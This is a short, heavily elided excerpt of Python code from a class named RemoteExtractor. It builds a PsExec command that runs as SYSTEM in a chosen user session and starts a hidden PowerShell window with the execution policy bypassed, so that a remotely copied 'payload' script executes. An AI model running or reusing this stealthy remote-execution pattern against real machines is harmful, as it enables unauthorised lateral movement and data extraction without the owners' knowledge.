...
class RemoteExtractor:
    ...
    def execute_remote_extraction(self) -> dict:
        ...
        try:
            ...
            psexec_cmd = f'cmd.exe /c "set PATH=C:\\PSTools;%PATH% && psexec -i {session_id} -s -accepteula cmd.exe /c \\"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File {payload_remote_path} {temp_dir} 2> {temp_dir}\\psexec_error.log\\""'
